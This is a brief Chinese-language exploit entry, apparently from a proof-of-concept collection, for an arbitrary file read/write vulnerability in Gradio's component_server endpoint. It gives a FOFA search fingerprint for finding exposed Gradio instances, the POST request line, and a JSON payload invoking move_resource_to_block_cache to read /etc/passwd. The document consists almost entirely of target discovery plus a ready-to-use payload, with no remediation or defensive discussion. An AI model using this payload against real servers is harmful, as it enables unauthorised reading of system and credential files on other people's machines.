# Gradiocomponent_server任意文件读取漏洞

Gradiocomponent ｜ 任意文件读取/写入 ｜ —
- **指纹**：`FOFA：body="__gradio_mode__"`
- **请求**：`POST /component_server HTTP/1.1`

**Payload**
```
{"component_id": "id值","data": "/etc/passwd","fn_name": "move_resource_to_block_cache","session_hash": "a"}
```